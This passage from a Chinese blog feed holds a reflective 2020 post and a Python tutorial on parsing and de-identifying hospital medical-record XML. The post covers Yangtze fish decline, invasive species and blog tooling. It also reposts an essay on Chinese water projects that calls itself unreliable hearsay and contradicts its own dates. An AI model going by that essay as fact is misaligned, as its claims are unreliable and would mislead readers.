<p>还记得当年的梦想吗，不仅天涯变了，新浪搜狐变了，谷歌也免不了（也许没变，当年才是装的）。看了一圈，真诚可爱的反而就是花姐王垠之流。</p>
<figure>
<img src="/aa1c/google.jpg" alt="当年" /><figcaption aria-hidden="true">当年</figcaption>
</figure>
<p>唯见日寒月暖，来煎人寿</p>
<blockquote>
<p>十年的经历教会了我很多，但不免也有许多被浪费的时间和精力，值得我反思和总结。总的看来，我并没有比其他人做得更差。很多 IT 人终其一生也没有学会什么新东西，很多人为了保住自己的饭碗，写出面条一样扭曲，别人不敢碰的代码。转岗做管理也是各种瞎指挥，看其他人眼色行事，一切为了“站对了队”，为了混到更高的位置。</p>
</blockquote>
<p>我现在在勃八本的劝退专业搬着没什么用的砖，搞着骗钱的垃圾项目划水摸鱼制造垃圾写bug，惭愧</p>
<p>本来我还是想做一点事情的，现在发现不如划水去搞点有意思的</p>
<div class="note success"><h3 id="看看范畴论矩阵代数">看看范畴论、矩阵代数</h3>
<p>大一大二那会不听课，埋头啃高代数分数理方程看朗道，试图啃过近世代数，没啃动 现在一年没怎么推公式，发现已经不如之前了，我怕不是要老了。 有些东西，三四十岁再学就学不动了</p>
</div>
<div class="note success"><h3 id="看看csapp等书">看看CSAPP等书</h3>
<p>补一补你电只讲名词概念浪费生命的微嵌课欠下的债</p>
</div>
<div class="note success"><h3 id="学一点数据库和javascript">学一点数据库和javascript</h3>
<p>之前打算</p>
</div>
<div class="note success"><h3 id="把立下的flag和挖的坑填了">把立下的Flag和挖的坑填了</h3>
<p>填不了就扔到2021年，反正那个时候我就要被消灭了，不用填了</p>
</div>
<div class="note danger"><h3 id="扑杀入侵物种">扑杀入侵物种</h3>
<p>包括不限于流浪猫、流浪狗、红耳龟、福寿螺、克氏原螯虾</p>
</div>
<h2 id="近况">近况</h2>
<p>最近闲了一点，把博客的评论换成了utteranc, 把mathjax换成了katex 试了试Hugo，速度确实快，也没有nodejs这么多依赖问题，但是颜值平均比Hexo低两层楼，Hexo那些插件也没有好的替代和移植。 也没有在Hugo里面找到一个Next这样令我喜欢并且一直维护的主题，只看到一个hugo-book的主题，替代gitbook做文档应该不错，gitbook的生成速度是真的慢。。。 （不过这个快是生成速度啊，整个网站的加载速度跟这个也没有太大关系，也就在写很长很多的内容的时候有，静态博客还是得看效果啊，生成速度再快有什么用呢） ps：终于知道为什么有的人用Jekyll、Hexo、gitbook非要整个CI了，有的内容多了生成速度确实慢啊，动不动几十分钟一小时没了。Hugo的速度让这些都没了必要，我也没看到多少这么搞的（Hugo用户运维和后端开发的比例可比Hexo那些高多了）。（Hugo性能也不错，直接用hugo的server跑在服务器都行，不用Nginx之类的完全没问题。</p>
<p>元旦在沙河边转着玩，又看到沙河有一群大妈拿着七八个桶直接倾倒鱼和小龙虾（对，就是那个<del>著名</del>入侵物种克氏原螯虾）。这几天网上冲浪又看到日人民报等辣鸡营销号消费过世白鲟，还纷纷把图配成匙吻鲟，心里不是滋味。长江流域基本也凉的差不多了，当年葛洲坝一建，白鲟中华鲟达氏鲟就凉了一半，挖沙和万安水库和富春江水电站也把最后的鲥鱼搞没了。鄱阳湖要是再乱搞，江豚基本也要凉透了（虽然不乱搞也要凉透了，时间问题，无力回天）。那些数不清名字的小鱼就更惨了，好多两个图片和影像都没留下</p>
<p>哦，对了，前几年长江养殖逃逸了大量杂交鲟，中华鲟和达氏鲟野生种群基本就废了</p>
<p>寡鳞鱊重现江湖的奇迹可能再也不会有了。</p>
<blockquote>
<p>千斤魶子万斤象，黄排大了不像样</p>
</blockquote>
<figure>
<img src="baixun.jpg" alt="白鲟" /><figcaption aria-hidden="true">白鲟</figcaption>
</figure>
<p>就现在这样子，不仅斑鳖要上路，鼋八成也保不住；不仅白鱀豚没了，江豚（窄脊江豚长江江豚亚种<em>N. a. asiaeorientalis</em>）也迟早凉。 斑鳖在某动物园的惨状大家应该都知道了，鼋也好不到哪去（国内的龟鳖都好不到哪去） &gt;鼋，到现在，都没有一个像样的保护区。也就是说，救助团体一直是民间（或挂靠）开展的。某保护区我就不点名了，有文件，一直不施工，民间捐的俩成体鼋一直养在水泥池子里……</p>
<p>最近被骂的<span class="exturl" data-url="aHR0cHM6Ly93ZWliby5jb20vNTAyMTAzNjc4Ni9JbkIxUmZrQkU=">扎龙保护区<i class="fa fa-external-link-alt"></i></span>也是打着保护的旗号干缺德事呢，对了，前几年的鄱阳湖水利枢纽工程也是打着环保的旗号。好多湿地绿化和荒漠绿化都是把原来好好的灌木草地沼泽全种成整齐划一的树，哇，这破坏生态的绿色荒漠算政绩呢 这里全文转载流年消年少同学的一篇旧文：从鄱阳湖水利枢纽工程看看党的千秋伟业</p>
<div class="note info"><blockquote>
<p>逆天改命，非以倾国之力而不能为</p>
</blockquote>
<p>​​​ 2016年底，微博上因为江西省水利厅一篇《 鄱阳湖水利枢纽环评 请你提建议》的公告引发了不小的风波。无疑这个举动将会对鄱阳湖生态环境造成巨大的负面影响，濒危的长江江豚、白鹤也将为此陷入灭绝的境地，那为什他们会出此下策呢？前几天与老师朋友讨论这个事情，个中缘由可能真的不简单。</p>
<p>下面都是胡说八道，大家请勿轻信 我们先看看好端端的鄱阳湖​为什么会见底？没错，因为我党的两项“千秋伟业”。 目前，中国两大世纪水利工程——三峡工程早已完成、南水北调工程东线刚刚正通水，中线已经贯通，西线还未开工中。对于如此重大的工程，一直有颇多争议，如修建三峡时，反对意见也非常强烈。三峡建成后，是否会引发干旱、地震等自然灾害都成为了人们热议的焦点。而奇怪的是，南水北调工程几乎没有专家反对，顺利开工建成。对南水北调的质疑也远远不如三峡工程。这是很令人奇怪的地方 多年前，一位旅居德国的国土专家王维洛为就揭底了南水北调和三峡，个中缘由触目惊心。 前几年长江中下游缺水缺得很厉害。从浙江、安徽、江西、湖南和湖北都缺水，特别是湖北省缺水缺的厉害。国内报导是说，湖北的水库都已底朝天，没水了，洪水浪打浪也没浪了。洪湖水也就剩几十厘米深。根本原因是因为湖北省担任了中国两个最大的工程—三峡和南水北调工程。其实这两个工程是一个姐妹工程，密不分，南水北调中线方案的源头工程，就是三峡的水源工程。三峡工程问题突出的原因，并非像国内宣传的那样是什么三峡派海外黑手搞的，其实是国内地方对中央矛盾所引起的。因为干旱现象在湖北和江西已非常突出了。 三峡工程干旱问题的治理，首先是江西省在13年提出来的，是省水利厅一些技术人员要搞鄱阳湖拦水大坝工程。为什么要建这个工程？是因为三峡大坝影响了鄱湖的蓄水，这么引出来的。 2013年的干旱，是当时专家预计的2030年要出现的，那么现在2011年就出现了。而且缺的很厉害，也不像人们说的南方水多，长江流域也将进入枯水，中下游缺缺的很厉害，尤其是湖北省。当时的湖北所有水库几乎是底朝天了。就是南水北调中线工程源头的水库—丹江河水库水位已降到死水位，没有水可以向外排放了。以当时湖北省要求三峡水库赶紧放水。如果当时三峡工程放水的话，就可以看到一个相当可怕的过程，就是说三峡把每天放3000至5000多立方米的水，但是水到湖北地区马上就被抽上去。 鄱阳湖快干枯江西省受不了，为什么？因为中国的抽水工程太厉害了，水泵太厉害了，把长江的水都抽到支流里去了。所以主流水位越往下游水量越少。所以人为自然干涉情况已到了很严重的地步。这种干旱情况未来还会重复出现，而且未来在用水问题上的矛盾还会更尖锐。 南水北调的是中线方案，是指从三峡把水调过去，而不是在丹江口把水调过去。要在三峡把洪水卡住，把三峡的水调到北方去。 长江在历史上流量最小时就有3000多立方/每秒，而黄河平均也就几百立方/每秒，两条河相差很多。长江平均年流量每秒是一万多立方。洪水期流量更大，千年遇的洪水流量大概是九万多立方/每秒，万年一遇的洪水流量是十一万多立方/每秒。如果回到长江的原始状态，其出海口是个湖，湖面宽是20多公里。唐诗中：“帆远影碧空尽，唯见长江天际流”，你会看到那是一条很宽广的河。所以在历史上说长江洪灾很少，而说黄河洪灾的记录就比较多。因为长江下游的蓄水能力很大所以洪水灾害比较小。所以现在长江水位少，而抽水就形成了湖北抽水，湖南就没有多少水可抽，那江西就更受不了，因为水位更低，所以鄱阳湖就像长江的水保住了，因此江西省闹得就特别厉害。 南水北调和三峡里面太多荒唐的东西了，建国以来中国的水利就是在玩水。它根本就不尊重自然规律，想把水折腾到哪儿就折腾到那儿。其实如果中国真的要调水就应该使用地下暗管，就像输油管道一样，埋在地下，又能省地、又没有风险，还能避免人家抢水，能保证进京的水。可是领导人必须让他的功绩让老百姓看得见还得让天上的卫星能够拍得到，比方说隋炀帝修的大运河还留在那儿，南水北调的工程是XXX搞的，三峡工程是XXX的，留在那儿的。 除了领导人，知识分子也是很聪明的，他们是有学习能力的。看看三峡工程中在最后报告上签字的那些专家们，最后都成了工程院和科学院的院士，成了对国家有献的特殊专家和院士，得了这个奖那个奖。你再看那看看那九位没有签名的专家，他们的水平绝对在签了字的人之上，但是没有一个人成为院士。中国的知识份子名利都看得很重，这也不是他们的错。这些还想进入科学最高殿堂的知识份子，他们在三峡工程的学习过程中，知道还是不说的好，说了也没有用。 因为他们的想是步入殿堂，如果他们说了的话，现在很可能连一个科研的题目、科研经费都拿不到。就像黄万里一样，给三峡工程写了那么多的论文，他有一分钱的科研经吗？他从朝廷拿了一分钱的科研经费吗？没有。 所以说，三峡工程在中国的学术界造成了一个很坏的影响，开了一个很坏的先例，后边的人知道了，尽管不是像当初那样被打成右派，可他把你打成另类，没有科经费，那你怎么办！你想当院士，没门。所以他们就不说了。我们一直在玩水的专家学者们，竟忘了一个最浅显的道理：水是从高往低流的，真乃一大黑色幽默。 当一件事，光有赞成而没有批评意见时，这件事错误的可能性很大。当三峡工程和南水北调工程只剩下一位黄万里先生，像唐吉珂德一样批评时，就注定了。 所以，鄱阳湖的现状就是这样， 不建大坝，江西无水可用；建了大坝，毁了白鹤和江豚栖息地。人与自然，在我朝一直就不是可以和谐发展的。 大家都知道这两项伟业贻害万年，谁又敢反对呢？ 民众反对--有个屁用，实在不行给你扣个反贼帽子你试试。地方官员反对--除非你想断送大好前途，呵呵。专学者反对--呵呵，当政者反对--否定前辈路线，自扇耳光。所以，这是一个很现实，也很魔幻的中国特色的伟业。 ~最后，祝伟大祖国繁荣昌盛，千秋万代！</p>
</div>
<p>十年之前，我还在上两江，那时候两江很热闹，现在两江也还开着（这里感谢饿老大，坚守到现在不容易）</p>
<p>在成都的河里湖里随便找找，能看到什么呢，满地食蚊红耳龟福寿螺罗非小龙虾，再找找才能看到点子陵和吸鳅爬鳅之类的，唉</p>
<blockquote class="blockquote-center">
<p>Repair what you can — but when you must fail,fail noisily and as soon as possible.</p>

</blockquote>
<p>不知巴拉水电站能否被拦下马，留给川陕哲罗鲑的时间不多了</p>
<p>十年前，小南海水电站，下马了</p>
<p><span class="exturl" data-url="aHR0cDovL2NxaDJvLmNvbS9mb3J1bS5waHA/bW9kPXZpZXd0aHJlYWQmYW1wO3RpZD0zMzUxMQ==">坚决反对修建小南海水电站<i class="fa fa-external-link-alt"></i></span></p>
<p>也罢</p>
<figure>
<img src="/aa1c/old.jpg" alt="道子搜山" /><figcaption aria-hidden="true">道子搜山</figcaption>
</figure>
<blockquote class="blockquote-center">
<p>君不见，高堂明镜悲白发，朝如青丝暮成雪</p>

</blockquote>
]]></content>
      <categories>
        <category>彼黍离离</category>
      </categories>
      <tags>
        <tag>2020</tag>
      </tags>
  </entry>
  <entry>
    <title>处理电子病历</title>
    <url>/81d4/</url>
    <content><![CDATA[<p>有两种鬼画符，一种是医生的字，一种是正则表达式 <a id="more"></a> 周某出狱了，而我也开始打工了，咳咳</p>
<p>最近开始折腾电子病历之类的东西，有几家医院的原始数据，几乎都是xml之类的（都是接口导出的，反正从医院要不到数据库里面的原始数据），不同医院数据格式和医生书写风格差的还挺大。</p>
<p><em>下面这些基本都是用的python的库</em></p>
<h2 id="解析和提取内容">解析和提取内容</h2>
<h3 id="脱敏">脱敏</h3>
<p>先脱敏，大概的姓名身份证号住址啥的都挑出来抹掉，一般拿正则表达式替换一下就行了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re

p1 <span class="token operator">=</span> <span class="token string">r'&lt;姓名.*?>.*?&lt;/姓名>'</span>
p2 <span class="token operator">=</span> <span class="token string">r'&lt;姓名>小明&lt;/姓名>'</span>
newtext <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>p1<span class="token punctuation">,</span> p2<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="提出内层html">提出内层html</h3>
<p>xml里面嵌套了一层html（还是html4.0），html里面又嵌套了几段xml</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soap:</span>Envelope</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>soap</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/soap/envelope/<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/
XMLSchema-instance<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsd</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soap:</span>Body</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>getHospitalInfoResponse</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://tempuri.org/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>getHospitalInfoResult</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>getHospitalInfoResult</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTML</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>HTML<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>
            HEAD<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>TITLE<span class="token entity named-entity" title="&gt;">&amp;gt;</span>Demo For Lord<span class="token entity named-entity" title="&lt;">&amp;lt;</span>/TITLE<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>META http-equiv=Content-Type 
            content="text/html; charset=unicode"<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>META content="MSHTML 6.00.2900.6182"

            中间太长略去

            多重耐药菌防控措施处置表 (42)出科病历评分表 (43)病历排序<span class="token entity named-entity" title="&lt;">&amp;lt;</span>/FONT<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>/P<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>P<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span>nbsp;<span class="token entity named-entity" title="&lt;">&amp;lt;</span>/P<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>/BODY<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>/HTML<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>HTML</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>errorMsg</span><span class="token punctuation">></span></span>string<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>errorMsg</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>getHospitalInfoResponse</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soap:</span>Body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soap:</span>Envelope</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>除了最外层的xml，其他的标签都被转码了。</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">@<span class="token entity named-entity" title="&amp;">&amp;amp;</span>lt;/FONT<span class="token entity named-entity" title="&amp;">&amp;amp;</span>gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>先把<code>&amp;amp;</code>转码回<code>&amp;</code>，再把<code>&amp;lt;</code>转为<code>&lt;</code>，<code>&amp;gt;</code>转回<code>&gt;</code></p>
<p>转完之后会变成熟悉的标签</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后删掉空格之类的<code>&amp;nbsp;</code>以及<code>&amp;amp;nbsp;</code></p>
<p>规整的数据，比如一些用标签区分出来的数据，解析一下XML或者用直接用正则表达式提出来</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#000000</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>STRONG</span><span class="token punctuation">></span></span>主诉:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STRONG</span><span class="token punctuation">></span></span>颈部不适伴头痛、头晕2周，加重1周。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">chief_compliant <span class="token operator">=</span> <span class="token string">r'(?&lt;=&lt;STRONG>主诉:&lt;/STRONG>).*?(?=&lt;/FONT>)|(?&lt;=&lt;STRONG>主诉：&lt;/STRONG>).*?(?=&lt;/FONT>)'</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="病案号等xml中的内容">病案号等xml中的内容</h3>
<p>病案号之类的可以用正则直接抽</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">medical_record_number <span class="token operator">=</span> <span class="token string">r'&lt;病案号.*?>.*?&lt;/病案号>'</span>
medical_record_number_temp <span class="token operator">=</span> regex<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>medical_record_number<span class="token punctuation">,</span> htmlhandle<span class="token punctuation">)</span>
<span class="token keyword">if</span> medical_record_number_temp<span class="token punctuation">:</span>
    modified_number <span class="token operator">=</span> <span class="token string">r'\d&#123;6&#125;(?=&lt;/病案号>)'</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"病案号："</span><span class="token punctuation">,</span> regex<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>modified_number<span class="token punctuation">,</span> medical_record_number_temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"病案号："</span><span class="token punctuation">,</span> <span class="token string">"Null"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="html部分">html部分</h3>
<p>要完整的把html中所有的字段都分析一下然后重新存到数据库里面，正则表达式就麻烦起来了，还是直接用xml库解析一下xml比较好，比如Xpath和Beautifulsoup之类的（这里建议数据量大、操作多的直接上lxml和regex、re2之类的，不用Beautifulsoup和re这两个库）</p>
<p>先用utf-8编码读取</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> xmlread<span class="token punctuation">:</span>
    xmltext <span class="token operator">=</span> xmlread<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>用lxml直接解析的时候会出报错，因为lxml不认unicode之类的，我们给他转成byte</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">ValueError: Unicode strings with encoding declaration are not supported. Please use bytes input or XML fragments without declaration.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>加一句</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">myxml_b <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span>xmltext<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后用lxml解析就好了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">myxml <span class="token operator">=</span> etree<span class="token punctuation">.</span>XML<span class="token punctuation">(</span>myxml_b<span class="token punctuation">)</span>
result <span class="token operator">=</span> etree<span class="token punctuation">.</span>tostring<span class="token punctuation">(</span>myxml<span class="token punctuation">,</span>pretty_print <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">,</span>encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>要提取的主要信息都在html部分里面，外层的xml里面没啥东西，我们直接把外层的xml扔了，解析里面的html</p>
<p>另存为html就可以在浏览器里看到了，使用F12调试工具可以直接抓取html里面元素的xpath</p>
<figure>
<img src="/81d4/image-20200426094024186.png" alt="病历" /><figcaption aria-hidden="true">病历</figcaption>
</figure>
<p>但是仔细一看发现这个病历的html标签每份不太一样，比如有的第10对p标签里面是主诉的东西，但是另一份病历第10对p标签里面是住院病人离院责任书。没有固定的标志位，不太好提，不如直接上正则。</p>
<p>多看了几份病历发现小问题很多，格式一点也规整，比如主诉，不同病历有下面这几种</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#000000</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>STRONG</span><span class="token punctuation">></span></span>主诉:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STRONG</span><span class="token punctuation">></span></span>颈部不适伴头痛、头晕2周，加重1周。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#000</span><span class="token punctuation">></span></span>主诉:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#ff0000</span><span class="token punctuation">></span></span>反复咳嗽、<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#4682b4</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#ff0000</span><span class="token punctuation">></span></span>心累、气紧6年，<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span>双下肢水肿4年，加重12天<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STRONG</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span>
<span class="token attr-name">&lt;P</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>steelblue</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>STRONG</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#000</span><span class="token punctuation">></span></span>主诉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STRONG</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span>:发现血压升高30+年，反复头晕4+月，加重1天<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>P</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>有的连冒号都被颜色标签截断了，最后索性用正则直接拉取含有主诉的p标签内的整段</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 主诉（re方法）</span>
<span class="token comment"># chief_compliant = r'(?&lt;=&lt;STRONG>主诉.*?&lt;/STRONG>).*?(?=&lt;/FONT>)|(?&lt;=&lt;STRONG>主诉：&lt;/STRONG>).*?(?=&lt;/FONT>)'</span>
chief_compliant <span class="token operator">=</span> <span class="token string">r'&lt;P>&lt;FONT color=steelblue>.*?主诉.*?&lt;/P>'</span>
chief <span class="token operator">=</span> regex<span class="token punctuation">.</span>search<span class="token punctuation">(</span>chief_compliant<span class="token punctuation">,</span> myhtml<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<figure>
<img src="/81d4/image-20200426220846518.png" alt="image-20200426220846518" /><figcaption aria-hidden="true">image-20200426220846518</figcaption>
</figure>
<p>输出的结果再把标签、主诉二字和冒号等删去</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pyquery <span class="token keyword">import</span> PyQuery
chief_text <span class="token operator">=</span> PyQuery<span class="token punctuation">(</span>chief<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> chief_text<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># clean the chief compliant text</span>
    p1 <span class="token operator">=</span> <span class="token string">r'主诉|\n|:|：'</span>
    chief_clean <span class="token operator">=</span> regex<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>chief_text<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span>chief_clean<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>差不多能看了</p>
<figure>
<img src="/81d4/image-20200426220726567.png" alt="image-20200426220726567" /><figcaption aria-hidden="true">image-20200426220726567</figcaption>
</figure>
<p>再用同样的方法提现病史的时候遇到了问题，发现正则会把之前主诉的内容也匹配上，这是python正则的懒惰匹配只能向后没有向前。一个办法是抽出来然后删掉主诉</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 现病史（re方法）</span>
phpi <span class="token operator">=</span> <span class="token string">r'&lt;P>&lt;FONT color=steelblue>.*?现病史.*?&lt;/P>'</span>
hpi <span class="token operator">=</span> regex<span class="token punctuation">.</span>search<span class="token punctuation">(</span>phpi<span class="token punctuation">,</span> myhtml<span class="token punctuation">)</span>
<span class="token keyword">if</span> hpi<span class="token punctuation">:</span>
    <span class="token comment"># remove_tag = r'&lt;[^>]+>'</span>
